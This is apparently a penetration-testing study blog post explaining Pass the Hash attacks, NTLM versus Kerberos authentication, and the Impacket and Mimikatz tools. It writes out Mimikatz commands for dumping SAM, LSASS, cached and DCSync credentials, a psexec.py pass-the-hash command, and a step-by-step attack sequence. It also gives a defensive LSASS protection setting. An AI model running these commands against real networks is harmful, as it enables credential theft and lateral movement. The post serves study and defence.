---
title: "Pass the Hash Attack: Principles and Defensive Measures"
description: "NTLM hash credentials, SAM, LSASS, and domain scenarios: Pass the Hash with Impacket and Mimikatz, plus credential-protection measures."
date: 2025-08-02T00:00:00.000Z
tags:
  - "Lateral Movement"
  - "Windows"
  - "Penetration Testing Studies"
  - "Incident Response"
authors:
  - "bx"
draft: false
slug: "passthehash-en"
lang: "en"
translationKey: "passthehash"
---

## Learning About Pass the Hash Attacks

**Simplified NTLM authentication flow:**

> This English translation example is relatively easy to understand.

1. **Client -> Server:** “Hi, I want to access your resource.”
2. **Server -> Client:** “Oh? Then prove who you are. Here is a random string (Challenge); encrypt it with your password and send it back to me.”
3. **Client:** The client encrypts this Challenge using the user's **NTLM hash** (not the plaintext password), generating a “response” (Response).
4. **Client -> Server:** “Here is the encrypted Response.”
5. **Server:** The server passes the Response to the domain controller (DC). The DC has all users' NTLM hashes and performs the same encryption calculation using the stored hash. If the result matches the Response sent by the client, it proves that the client has the correct credentials, and authentication succeeds.

### Common extraction locations

From this process, we can see that authentication depends on the **NTLM hash**, not the plaintext password.

**NTLM hashes are generally stored in the following two locations:**

+ **SAM file:** For local accounts, hashes are stored in the `C:\Windows\System32\config\SAM` file. This file is locked while the system is running.

```bash
# mimikatz 
lsadump::sam
```

+ **LSASS process memory:** After a user logs in (whether locally, through Remote Desktop, or by running a service), the system caches that user's credentials (including the NTLM hash) in the memory of a process named `lsass.exe` (Local Security Authority Subsystem Service) to facilitate subsequent authentication. **This is the primary hash source for PtH attacks.**

```bash
#mimikatz 
privilege::debug sekurlsa::logonpasswords
```

+ **DCSync**

Simulates a domain controller replication request to retrieve user hashes from a DC.

```bash
mimikatz 
lsadump::dcsync /user:DOMAIN\Administrator
```

### Typical attack process

A typical PTH attack in a domain environment generally proceeds as follows:

1. **Gain access to a host in the domain** (possibly with low privileges).
2. **Extract hashes from LSASS or SAM.**
3. **Use a PTH tool to establish a session:**
   - Built into Windows:

```plain
runas /netonly /user:DOMAIN\Administrator cmd
```

    - Impacket:

```plain
python3 psexec.py DOMAIN/Administrator@TARGET -hashes <LMhash>:<NThash>
```

4. Continue lateral movement.

### Defensive measures

+ Disable NTLM or restrict its use (replace it with Kerberos).
+ Enable **LSASS protection (RunAsPPL):**

```plain
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

...

## NTLM and Kerberos

> Summarized by GPT-5

### NTLM (NT LAN Manager)

#### Core characteristics

+ A **Challenge-Response** protocol.
+ It does not transmit plaintext passwords directly; instead, an **NTLM hash** participates in the encryption calculation.
+ Mainly used in:
  - Scenarios where Kerberos cannot be used (such as non-domain environments, cross-domain situations, and interactions with legacy systems).
  - Some legacy applications and protocols (SMBv1/2, RPC, RDP, etc.).

#### Simplified authentication flow

1. The client initiates a request.
2. The server sends a random **Challenge** (8 bytes).
3. The client calculates a Response using the **NTLM hash + Challenge**.
4. The server passes the Response to the domain controller (or local SAM database) for verification.

> **Weaknesses**
>
> + **The hash is the credential** → anyone who obtains the hash can authenticate (the core of PTH attacks).
> + It cannot resist replay attacks (unless the Challenge is single-use and valid only for a short time).
> + It has no strongly encrypted session ticket, so it is less secure than Kerberos.

### Kerberos

> Kerberos is a widely used **network authentication protocol**. It provides secure authentication between clients and servers in an untrusted network environment. Its central idea is to use a trusted third party to verify the identities of both communicating parties.

#### Core characteristics

+ A ticket-based authentication protocol.
+ Uses symmetric encryption (AES, RC4, etc.) and timestamps to prevent replay attacks.
+ Used by default in Windows domain environments; NTLM is the fallback.
+ Designed for single sign-on (SSO): log in once to access multiple machines in the domain.

#### Participants

+ Client (User/Machine)
+ Service (Server)
+ KDC (Key Distribution Center) → typically hosted on a domain controller and includes:
  - AS (Authentication Service): initial authentication
  - TGS (Ticket Granting Service): issues service tickets

#### Simplified authentication flow

1. Initial authentication (AS exchange)
   - The client requests a TGT (Ticket Granting Ticket) from the KDC.
   - The KDC encrypts the TGT using the user's password hash → successful decryption by the client proves its identity.
2. Requesting a service ticket (TGS exchange)
   - The client uses its TGT to request a ticket for a service from the KDC.
   - The KDC generates a service ticket and encrypts it with the service's key.
3. Accessing the service (AP exchange)
   - The client presents the service ticket to the target service → the service decrypts and verifies it → a session is established.

> **Advantages**
>
> + Does not rely on the hash for direct login (unlike NTLM, the hash does not directly participate in the Challenge).
> + Effectively prevents replay attacks (tickets have timestamps and lifetimes).
> + Supports mutual authentication (the client and server verify each other).
>
> **Weaknesses**
>
> + If an attacker obtains a **TGT or TGS ticket**, they can still forge a session (**Pass-the-Ticket attack**).
> + If the KDC/domain controller is compromised, the entire domain is compromised (Golden Ticket/Silver Ticket attacks).

## Impacket suite

> Impacket is an “aircraft carrier” of command-line tools for internal network penetration testing: it wraps complex Windows network-protocol attacks in easy-to-use scripts.

Simply put, Impacket is a collection of Python libraries for working with network protocols.

[GitHub - fortra/impacket: Impacket is a collection of Python classes for working with network protocols.](https://github.com/fortra/impacket)

## Mimikatz (“Kiwi”)

### Common operations

**Elevate privileges**

```plain
privilege::debug
```

**Export system credentials:**

```plain
sekurlsa::logonpasswords
```

**Export the SAM database:**

```plain
lsadump::sam
```

**Export cached domain credentials:**

```plain
lsadump::cache
```

**Kerberos ticket operations:**

```plain
sekurlsa::tickets
kerberos::list
```

**Export NTDS.dit (domain controller):**

```plain
lsadump::dcsync /user:Administrator
```

## References

[Pass the Hash Attack - kalixcn - CNBlogs](https://www.cnblogs.com/kalixcn/p/18138330)

[What is a Pass-the-Hash Attack? | CrowdStrike](https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack/)

